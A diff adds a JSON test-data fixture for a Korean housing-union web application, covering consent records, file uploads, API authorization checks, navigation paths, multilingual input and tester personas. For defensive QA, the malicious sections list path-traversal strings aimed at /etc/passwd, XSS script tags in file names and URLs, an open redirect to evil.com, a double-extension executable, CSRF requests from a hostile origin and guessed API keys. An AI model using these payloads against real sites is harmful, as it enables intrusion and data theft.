+          "_note": "Non-standard dong/ho format"
+        }
+      ]
+    }
+  },
+
+  "consent": {
+    "valid": [
+      {
+        "user_id": "user-001",
+        "stage_id": "stage-001",
+        "status": "AGREED",
+        "consent_date": "2026-02-01"
+      },
+      {
+        "user_id": "user-002",
+        "stage_id": "stage-001",
+        "status": "DISAGREED",
+        "consent_date": "2026-02-01"
+      },
+      {
+        "user_id": "user-003",
+        "stage_id": "stage-001",
+        "status": "PENDING"
+      }
+    ],
+    "invalid": [
+      {
+        "status": "MAYBE",
+        "_note": "Invalid consent status"
+      },
+      {
+        "user_id": "nonexistent",
+        "stage_id": "stage-001",
+        "_note": "Non-existent user"
+      }
+    ]
+  },
+
+  "files": {
+    "valid": [
+      {
+        "name": "총회_안내문.pdf",
+        "type": "application/pdf",
+        "size": 1048576,
+        "_note": "1MB PDF"
+      },
+      {
+        "name": "현장사진.jpg",
+        "type": "image/jpeg",
+        "size": 2097152,
+        "_note": "2MB JPEG"
+      },
+      {
+        "name": "조합원명부.xlsx",
+        "type": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
+        "size": 524288,
+        "_note": "512KB Excel"
+      }
+    ],
+    "boundary": [
+      {
+        "name": "a.txt",
+        "type": "text/plain",
+        "size": 1,
+        "_note": "1 byte file"
+      },
+      {
+        "name": "한글파일이름_테스트_아주_긴_파일명_으로_테스트합니다_이것은_파일명_길이_제한을_확인하기위한_테스트파일입니다.pdf",
+        "type": "application/pdf",
+        "size": 10485760,
+        "_note": "Very long Korean filename, 10MB"
+      }
+    ],
+    "invalid": [
+      {
+        "name": "",
+        "type": "application/pdf",
+        "_note": "Empty filename"
+      },
+      {
+        "name": "script.exe",
+        "type": "application/x-executable",
+        "_note": "Executable file type"
+      }
+    ],
+    "malicious": [
+      {
+        "name": "../../etc/passwd",
+        "type": "text/plain",
+        "_note": "Path traversal in filename"
+      },
+      {
+        "name": "image.jpg.exe",
+        "type": "image/jpeg",
+        "_note": "Double extension attack"
+      },
+      {
+        "name": "<script>alert(1)</script>.pdf",
+        "type": "application/pdf",
+        "_note": "XSS in filename"
+      }
+    ]
+  },
+
+  "api_requests": {
+    "auth_bypass_attempts": [
+      {
+        "endpoint": "/api/admin/access-tokens",
+        "method": "GET",
+        "headers": {},
+        "_note": "No auth header - should return 401"
+      },
+      {
+        "endpoint": "/api/admin/access-tokens",
+        "method": "GET",
+        "headers": { "Authorization": "Bearer invalid-token-12345" },
+        "_note": "Invalid bearer token - should return 401"
+      },
+      {
+        "endpoint": "/api/admin/access-tokens",
+        "method": "GET",
+        "headers": { "x-internal-api-key": "guessed-api-key" },
+        "_note": "Guessed internal API key - should fail"
+      },
+      {
+        "endpoint": "/api/members/approve",
+        "method": "POST",
+        "role": "USER",
+        "_note": "Non-admin trying admin endpoint - should return 403"
+      },
+      {
+        "endpoint": "/api/sms/send",
+        "method": "POST",
+        "role": "USER",
+        "_note": "Non-admin trying SMS send - should return 403"
+      }
+    ],
+    "csrf_attempts": [
+      {
+        "method": "POST",
+        "endpoint": "/api/members/approve",
+        "headers": { "Origin": "https://evil-site.com", "Host": "johapon.kr" },
+        "_note": "CSRF with mismatched Origin - should be blocked"
+      },
+      {
+        "method": "DELETE",
+        "endpoint": "/api/admin/access-tokens/some-id",
+        "headers": { "Origin": null },
+        "_note": "Missing Origin header on DELETE - should be blocked"
+      }
+    ],
+    "sms_send": {
+      "valid": {
+        "unionId": "test-union-001",
+        "recipients": [
+          { "name": "홍길동", "phone": "01023456789" },
+          { "name": "김철수", "phone": "01089012345" }
+        ],
+        "message": "조합 정기총회 안내: 2026년 3월 15일 14시 강남구민회관",
+        "msgType": "LMS",
+        "title": "정기총회 안내"
+      },
+      "invalid": {
+        "missing_recipients": {
+          "unionId": "test-union-001",
+          "recipients": [],
+          "message": "테스트",
+          "msgType": "SMS"
+        },
+        "invalid_msg_type": {
+          "unionId": "test-union-001",
+          "recipients": [{ "name": "홍길동", "phone": "01023456789" }],
+          "message": "테스트",
+          "msgType": "INVALID"
+        }
+      }
+    }
+  },
+
+  "navigation": {
+    "public_paths": [
+      "/",
+      "/contact",
+      "/privacy",
+      "/terms",
+      "/test-union",
+      "/test-union/register",
+      "/swagger"
+    ],
+    "auth_required_paths": [
+      "/test-union/dashboard",
+      "/test-union/free-board",
+      "/test-union/news/notice",
+      "/test-union/news/qna",
+      "/test-union/communication/free-board",
+      "/test-union/communication/union-info",
+      "/test-union/my-property"
+    ],
+    "admin_paths": [
+      "/test-union/admin/members",
+      "/test-union/admin/consent",
+      "/test-union/admin/access-tokens"
+    ],
+    "system_admin_paths": [
+      "/systemAdmin",
+      "/systemAdmin/unions",
+      "/systemAdmin/login"
+    ],
+    "malicious_paths": [
+      "/test-union/admin/members/../../../etc/passwd",
+      "/test-union/admin/members?redirect=https://evil.com",
+      "/%2e%2e/%2e%2e/etc/passwd",
+      "/test-union/admin/members#<script>alert(1)</script>"
+    ]
+  },
+
+  "multilingual": {
+    "korean": {
+      "name": "홍길동",
+      "content": "안녕하세요. 테스트 내용입니다.",
+      "address": "서울특별시 강남구 역삼동 123-45"
+    },
+    "japanese": {
+      "name": "田中太郎",
+      "content": "テスト内容です。"
+    },
+    "chinese": {
+      "name": "张三",
+      "content": "测试内容。"
+    },
+    "emoji": {
+      "name": "테스터 🎉",
+      "content": "이모지 테스트 👍🏻🇰🇷🔥💯"
+    },
+    "mixed": {
+      "name": "Kim테스트test123",
+      "content": "한글English日本語中文混合テスト"
+    },
+    "rtl": {
+      "name": "محمد",
+      "content": "اختبار النص العربي"
+    },
+    "special_unicode": {
+      "name": "test\u200Buser",
+      "content": "Zero-width\u200Bspace\u200Btest",
+      "_note": "Zero-width space characters"
+    }
+  },
+
+  "persona_data_mapping": {
+    "P1_Methodical": {
+      "description": "Uses only valid data, follows workflows sequentially",
+      "user_profile": "users.valid.admin",
+      "content_data": ["notices.valid", "questions.valid", "comments.valid"],
+      "management_data": ["member_management.approval.valid", "member_management.block.valid"],
+      "search_data": "search_queries.valid",
+      "access_tokens": "access_tokens.valid",
+      "property_data": "property.pnu.valid"
+    },
+    "P2_Chaos": {
+      "description": "Mixes boundary, invalid, and random valid data unpredictably",
+      "user_profile": "users.boundary",
+      "content_data": ["notices.boundary", "notices.invalid", "questions.boundary", "comments.boundary", "comments.invalid"],
+      "management_data": ["member_management.approval.invalid", "member_management.rejection.invalid"],
+      "search_data": ["search_queries.boundary", "search_queries.malicious"],
+      "access_tokens": ["access_tokens.boundary", "access_tokens.invalid"],
+      "property_data": ["property.pnu.boundary", "property.pnu.invalid"]
+    },
+    "P3_Newbie": {
+      "description": "Uses simple valid data, may leave optional fields empty",
+      "user_profile": "users.valid.regular_user",
+      "content_data": {
+        "free_board": {
+          "title": "첫 게시글입니다",
+          "content": "<p>안녕하세요 처음 가입했습니다.</p>"
+        },
+        "question": {
+          "title": "가입 후 뭘 해야 하나요?",
+          "content": "<p>처음이라 잘 모르겠습니다.</p>",
+          "is_secret": false
+        },
+        "comment": {
+          "content": "감사합니다"
+        }
+      },
+      "search_data": [{ "query": "공지" }, { "query": "질문" }]
+    },
+    "P4_Impatient": {
+      "description": "Uses valid data but performs rapid actions (double-clicks, rapid navigation)",
+      "user_profile": "users.valid.regular_user",
+      "rapid_actions": {
+        "double_click_approve": { "memberId": "user-pending-001", "clicks": 2, "interval_ms": 50 },
+        "double_click_submit": { "form": "register", "clicks": 3, "interval_ms": 100 },
+        "rapid_navigation": { "pages": ["notice/1", "notice/2", "notice/3"], "interval_ms": 200 },
+        "rapid_search": { "queries": ["홍", "홍길", "홍길동"], "interval_ms": 100 }
+      },
+      "content_data": {
+        "notice_view": "notices.valid[0]",
+        "comment": { "content": "빨리빨리" }
+      }
+    },
+    "P5_Perfectionist": {
+      "description": "Fills every single field including all optional ones",
+      "user_profile": {
+        "name": "완벽주의자",
+        "email": "perfect@test.com",
+        "phone_number": "010-5555-5555",
+        "birth_date": "1988-06-15",
+        "property_address": "서울특별시 강남구 역삼동 999-88",
+        "property_address_detail": "럭셔리타워 A동 3301호",
+        "property_zonecode": "06232",
+        "resident_address": "서울특별시 서초구 반포동 11-1",
+        "resident_address_detail": "반포자이 102동 2201호",
+        "resident_address_road": "서울특별시 서초구 반포대로 100",
+        "resident_zonecode": "06535",
+        "property_type": "APARTMENT",
+        "notes": "모든 필드를 완벽하게 입력하는 사용자입니다."
+      },
+      "content_data": {
+        "free_board": {
+          "title": "완벽한 게시글 - 모든 요소 포함",
+          "content": "<h2>제목</h2><p>본문 내용입니다.</p><ul><li>항목 1</li><li>항목 2</li></ul><p><strong>강조</strong>와 <em>이탤릭</em>도 사용합니다.</p><blockquote>인용문도 포함합니다.</blockquote>",
+          "attachments": ["files.valid[0]", "files.valid[1]", "files.valid[2]"]
+        },
+        "question": {
+          "title": "상세한 질문 - 배경, 현황, 요청사항 포함",
+          "content": "<h3>배경</h3><p>2020년 조합 설립 이후 관리비 산정 기준에 대해 궁금합니다.</p><h3>현황</h3><p>현재 전용면적 기준으로 산정되고 있으나 일부 공용시설 사용에 대한 추가 비용이 있습니다.</p><h3>요청사항</h3><p>1. 관리비 항목별 상세 내역<br>2. 공용시설 사용료 기준<br>3. 관리규약 관련 조항</p>",
+          "is_secret": false
+        }
+      }
+    },
+    "P6_Malicious": {
+      "description": "Uses all malicious and invalid data, probes for vulnerabilities",
+      "user_profile": "users.malicious",
+      "content_data": ["notices.malicious", "questions.malicious", "free_boards.malicious", "comments.malicious"],
+      "search_data": "search_queries.malicious",
+      "api_requests": "api_requests.auth_bypass_attempts",
+      "csrf_attacks": "api_requests.csrf_attempts",
+      "access_tokens": "access_tokens.malicious",
+      "navigation": "navigation.malicious_paths",
+      "files": "files.malicious",
+      "property_data": "property.pnu.malicious",
+      "management_data": "member_management.block.malicious"
+    },
+    "P7_Mobile": {
+      "description": "Uses short, simple valid data suitable for mobile input",
+      "user_profile": {
+        "name": "모바일유저",
+        "email": "m@t.kr",
+        "phone_number": "010-7777-7777"
+      },
+      "content_data": {
+        "free_board": {
+          "title": "짧은 글",
+          "content": "<p>모바일에서 작성</p>"
+        },
+        "comment": { "content": "확인" },
+        "question": {
+          "title": "간단 문의",
+          "content": "<p>답변 부탁드립니다</p>",
+          "is_secret": false
+        }
+      },
+      "viewport": { "width": 375, "height": 812, "device": "iPhone 13" }
+    },
+    "P8_PowerUser": {
+      "description": "Large datasets, extensive search, pagination stress",
+      "user_profile": "users.valid.regular_user",
+      "bulk_data": {
+        "search_iterations": 50,
+        "pagination_pages": 20,
+        "comments_per_post": 30,
+        "posts_to_browse": 100
+      },
+      "search_data": [
+        { "query": "가", "context": "broad search returning many results" },
+        { "query": "관리비 산정 기준 안내 총회", "context": "multi-keyword search" }
+      ],
+      "content_data": {
+        "batch_comments": [
+          { "content": "댓글 1번 - 동의합니다." },
+          { "content": "댓글 2번 - 추가 의견입니다." },
+          { "content": "댓글 3번 - 참고 부탁드립니다." },
+          { "content": "댓글 4번 - 관련 자료 공유합니다." },
+          { "content": "댓글 5번 - 좋은 의견 감사합니다." }
+        ]
+      }
+    },
+    "P9_A11y": {
+      "description": "Standard valid data, focus on keyboard navigation and ARIA",
+      "user_profile": "users.valid.regular_user",
+      "content_data": ["notices.valid", "questions.valid", "comments.valid"],
+      "a11y_actions": {
+        "tab_navigation": true,
+        "enter_key_submit": true,
+        "escape_key_close": true,
+        "focus_trap_modals": true,
+        "skip_nav_link": true,
+        "aria_labels": true,
+        "screen_reader_compat": true
+      },
+      "modal_interactions": [
+        "RegisterModal",
+        "ApprovalPendingModal",
+        "ApprovalRejectedModal",
+        "BlockedUserModal",
+        "ConfirmModal",
+        "AlertModal",
+        "BlockMemberModal",
+        "MemberEditModal"
+      ]
+    },
+    "P10_International": {
+      "description": "Multilingual data with access token for guest access",
+      "user_profile": "multilingual",
+      "access_token": "access_tokens.valid[0]",
+      "content_data": {
+        "comments": [
+          { "content": "한국어 댓글입니다." },
+          { "content": "English comment." },
+          { "content": "日本語のコメントです。" },
+          { "content": "中文评论。" },
+          { "content": "Emoji comment 🎉👍🔥" }
+        ]
+      },
+      "search_data": [
+        { "query": "한글검색" },
+        { "query": "English" },
+        { "query": "日本語" },
+        { "query": "🔍" }
+      ]
+    }
+  },
+
+  "registration_flow": {
+    "valid": {
+      "oauth_provider": "kakao",
+      "form_data": {
+        "name": "신규가입자",
+        "phone_number": "010-0000-1234",
+        "birth_date": "1995-03-20",
+        "property_type": "APARTMENT",
+        "property_address": "서울특별시 강남구 역삼동 100-1",
+        "property_address_detail": "101동 301호",
+        "dong": "101동",
+        "ho": "301호",
+        "resident_address": "서울특별시 서초구 서초동 200-2",
+        "resident_address_detail": "201호"
+      }
+    },
+    "boundary": {
+      "minimal_registration": {
+        "name": "최소등록",
+        "phone_number": "010-0000-0000",
+        "property_address": "서울 강남구",
+        "_note": "Only required fields filled"
+      }
+    },
+    "double_submit": {
+      "form_data": {
+        "name": "이중제출",
+        "phone_number": "010-1111-0000"
+      },
+      "submit_count": 2,
+      "interval_ms": 50,
+      "_note": "Double-click prevention test (useRef guard in RegisterModal)"
+    }
+  },
+
+  "view_count_dedup": {
+    "scenarios": [
+      {
+        "entity": "notice",
+        "id": 1,
+        "sessionStorage_key": "viewed_notice_1",
+        "expected": "First visit increments, refresh does not"
+      },
+      {
+        "entity": "question",
+        "id": 1,
+        "sessionStorage_key": "viewed_question_1",
+        "expected": "First visit increments, refresh does not"
+      },
+      {
+        "entity": "free_board",
+        "id": 1,
+        "sessionStorage_key": "viewed_free_board_1",
+        "expected": "First visit increments, refresh does not"
+      },
+      {
+        "entity": "union_info",
+        "id": 1,
+        "sessionStorage_key": null,
+        "expected": "Every visit increments (known issue DFI-001)"
+      }
+    ]
+  }
+}
